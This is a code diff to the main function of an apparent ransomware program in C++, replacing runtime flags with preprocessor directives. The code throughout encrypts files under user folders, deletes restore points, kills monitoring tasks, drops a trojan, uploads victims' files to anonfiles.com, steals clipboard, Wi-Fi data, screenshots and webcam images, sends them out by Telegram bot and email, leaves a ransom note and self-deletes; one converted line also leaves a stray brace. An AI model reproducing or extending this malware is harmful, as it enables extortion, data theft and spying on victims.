@@ -18,46 +18,53 @@ int main(int argc, char* argv[]) {
         exit(0);
 
     // check if being debugged
+#if ANTIDEBUG
     if (AntiDebug())
         exit(0);
+#endif
 
     // show window if it is in debug mode
-    if (!DEBUG)
-        ShowWindow(GetConsoleWindow(), SW_HIDE);
+#if !DEBUG
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+#endif
 
     // open a new thread which deletes bad open tasks
-    if (TSK_REMOVER)
-        HANDLE hThreadTaskMng = CreateThread(NULL, 0, RemoveTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
+#if TSK_REMOVER
+    HANDLE hThreadTaskMng = CreateThread(NULL, 0, RemoveTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
+#endif
 
     // increase PE image size
-    if (ANTI_DUMPER)
-        ImageSizeIncreaser();
+#if ANTI_DUMPER
+    ImageSizeIncreaser();
+#endif
 
     // open a new thread which is the trojan horse
-    if (TROJAN) {
-        // drop trojan file
-        if (DROPRUN_TROJAN_FILE)
-            DropFile(TrojanFileContent, TROJANFILE);
-        HANDLE hThreadTrojan = CreateThread(NULL, 0, TrojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
-    }
+#if TROJAN
+    // drop trojan file
+#if DROPRUN_TROJAN_FILE
+    DropFile(TrojanFileContent, TROJANFILE);
+#endif
+    HANDLE hThreadTrojan = CreateThread(NULL, 0, TrojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
+#endif
     
     // delete restore points
-    if (DELETE_RESTOREPOINT)
-        DeleteRestorePoints();
+#if DELETE_RESTOREPOINT
+    DeleteRestorePoints();
+#endif
 
 
     // retrieve the directory in which to encrypt files
     string dir;
-    if (!DEBUG)
-        dir = (string)skCrypt("C:\\Users\\");
-    else {
-        if (argc > 1)
-            dir = argv[1];
-        else if (FileExists(DEBUG_FOLDER))
-            dir = DEBUG_FOLDER;
-        else
-            dir = (string)skCrypt(".\\");
-    }
+#if !DEBUG
+    dir = (string)skCrypt("C:\\Users\\");
+#else
+    if (argc > 1)
+        dir = argv[1];
+    else if (FileExists(DEBUG_FOLDER))
+        dir = DEBUG_FOLDER;
+    else
+        dir = (string)skCrypt(".\\");
+#endif
 
     // retrieve the files to be encrypted
     vector<string> files = GetFiles(dir);
@@ -70,21 +77,21 @@ int main(int argc, char* argv[]) {
     vector<vector<string>> filesSplitted = VectorSplitter(files, MAX_THREADS);
     
     // change file icon
-    if (CHANGE_FILE_ICON) {
-        DropFile(FileIconContent, FILESICON);
-        ChangeIcon();
-    }
+#if CHANGE_FILE_ICON
+    DropFile(FileIconContent, FILESICON);
+    ChangeIcon();
+#endif
 
 
     thread threads[MAX_THREADS];
 
     // upload the files to anonfiles.com
-    if (FILE_UPLOADER) {
-        for (int i = 0; i < filesSplitted.size(); i++)
-            threads[i] = thread(UploadFiles, filesSplitted[i]);
-        for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish uploading files
-            threads[i].join();
-    }
+#if FILE_UPLOADER
+    for (int i = 0; i < filesSplitted.size(); i++)
+        threads[i] = thread(UploadFiles, filesSplitted[i]);
+    for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish uploading files
+        threads[i].join();
+#endif
 
     // generate key & iv
     string key = aes_encrypt(KEYOFKEY, GenerateRandom(32), IV);
@@ -136,76 +143,82 @@ int main(int argc, char* argv[]) {
 
     // links.txt content
     string links_txt = (string)skCrypt("");
-    if (FILE_UPLOADER)
-        for (string link : GetLinks())
-            links_txt += link + (string)skCrypt("\n");
+#if FILE_UPLOADER
+    for (string link : GetLinks())
+        links_txt += link + (string)skCrypt("\n");
+#endif
     links_txt = aes_encrypt(KEY, links_txt, IV);
     infoFileContent += links_txt;
     infoFileContent += skCrypt("\n");
 
     // clipboard.txt content
-    if (GET_CLIPBOARD)
-        infoFileContent += aes_encrypt(KEY, GetClipboard(), IV);
+#if GET_CLIPBOARD
+    infoFileContent += aes_encrypt(KEY, GetClipboard(), IV);
+#endif
     infoFileContent += skCrypt("\n");
 
     // wifi.txt content
-    if (GET_WIFI)
-        infoFileContent += aes_encrypt(KEY, GetWifi(), IV);
+#if GET_WIFI
+      infoFileContent += aes_encrypt(KEY, GetWifi(), IV);
+#endif
     infoFileContent += skCrypt("\n");
 
     // screenshot.bmp content
-    if (GET_SCREENSHOT)
-        infoFileContent += aes_encrypt(KEY, GetScreenshot(), IV);
+#if GET_SCREENSHOT
+    infoFileContent += aes_encrypt(KEY, GetScreenshot(), IV);
+#endif
     infoFileContent += skCrypt("\n");
 
     // photos content
     string webcams = (string)skCrypt("");
-    if (TAKE_WEBCAMS) {
-        TakeWebcams();
-        for (string file : GetWebcams())
-            webcams += file + "\n";
-    }
+#if TAKE_WEBCAMS
+    TakeWebcams();
+    for (string file : GetWebcams())
+        webcams += file + "\n";
+#endif
     webcams = aes_encrypt(KEY, webcams, IV);
     infoFileContent += webcams;
     infoFileContent += skCrypt("\n");
 
     // delete PE header
-    if (ANTI_DUMPER)    // it creates problems if put first
-        PEHeaderDeleter();
+#if ANTI_DUMPER    // it creates problems if put first
+    PEHeaderDeleter();
+#endif
 
     // make a backup of infoFile
-    if (DEBUG && BACKUP_INFOFILE) {
-        ofstream infoFileBackup(Split(INFOFILE, '\\').back());
-        infoFileBackup << infoFileContent;
-        infoFileBackup.close();
-    }
+#if DEBUG && BACKUP_INFOFILE
+    ofstream infoFileBackup(Split(INFOFILE, '\\').back());
+    infoFileBackup << infoFileContent;
+    infoFileBackup.close();
+#endif
     
     // drop infoFile
-    bool dropInfoFile = DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT);
-    if (dropInfoFile) {
-        ofstream infoFile(INFOFILE);
-        infoFile << infoFileContent;
-        infoFile.close();
-    }
+#if (DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT)) {
+    ofstream infoFile(INFOFILE);
+    infoFile << infoFileContent;
+    infoFile.close();
+#endif
 
     // send infoFile to telegram bot
-    if (DEBUG ? DEBUG_SEND_TGBOT : SEND_TGBOT)
-        SendTelegramInfo();
+#if (DEBUG ? DEBUG_SEND_TGBOT : SEND_TGBOT)
+    SendTelegramInfo();
+#endif
 
     // send infoFile to the email
-    if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL) {
-        if (IsConnected2Internet())
-            SendEmail();
-        else {
-            DropFile(EmailSenderContent, EMAILSENDER);
-            ScheduleTask();
-        }
+#if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL)
+    if (IsConnected2Internet())
+        SendEmail();
+    else {
+        DropFile(EmailSenderContent, EMAILSENDER);
+        ScheduleTask();
     }
+#endif
 
     // drop infoFile
-    if (dropInfoFile)
-        if (remove((INFOFILE).c_str()) != 0)
-            DeleteFileA((INFOFILE).c_str());
+#if (DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT))
+    if (remove((INFOFILE).c_str()) != 0)
+        DeleteFileA((INFOFILE).c_str());
+#endif
 
 
     // wait for all threads to finish encrypting files
@@ -214,38 +227,45 @@ int main(int argc, char* argv[]) {
     
 
     // drop decryptor.exe
-    if (DROP_DECRYPTOR)
-        DropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
+#if DROP_DECRYPTOR
+    DropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
+#endif
 
     // drop README.txt
-    if (DROP_README)
-        DropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt"));
+#if DROP_README
+    DropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt"));
+#endif
 
     // drop custom file
-    if (DROP_CUSTOM_FILE)
-        DropFile(CustomFileContent, CUSTOMFILE_LOC);
+#if DROP_CUSTOM_FILE
+    DropFile(CustomFileContent, CUSTOMFILE_LOC);
+#endif
 
     // change wallpaper
-    if (CHANGE_WALLPAPER)
-        ChangeWallpaper(WallpaperContent);
+#if CHANGE_WALLPAPER
+    ChangeWallpaper(WallpaperContent);
+#endif
 
     // send custom command
-    if (SEND_CUSTOM_COMMAND)
-        system((CUSTOM_COMMAND).c_str());
-
+#if SEND_CUSTOM_COMMAND
+    system((CUSTOM_COMMAND).c_str());
+#endif
 
     // debug output
-    if (DEBUG) {
-        cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, info_txt, IV) << skCrypt("\n");
-        cout << skCrypt("Crypted files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
-        if (FILE_UPLOADER)
-            cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
-        system("pause");
-    }
+#if DEBUG
+    cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, info_txt, IV) << skCrypt("\n");
+    cout << skCrypt("Crypted files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
+#if FILE_UPLOADER
+    cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
+#endif
+    system("pause");
+#endif
 
     // self delete
-    if (!DEBUG && argc > 0 && SELFKILL)
+#if !DEBUG && SELFKILL
+    if (argc > 0)
         DeleteMe((string)argv[0]);
+#endif
 
     return 0;
 }
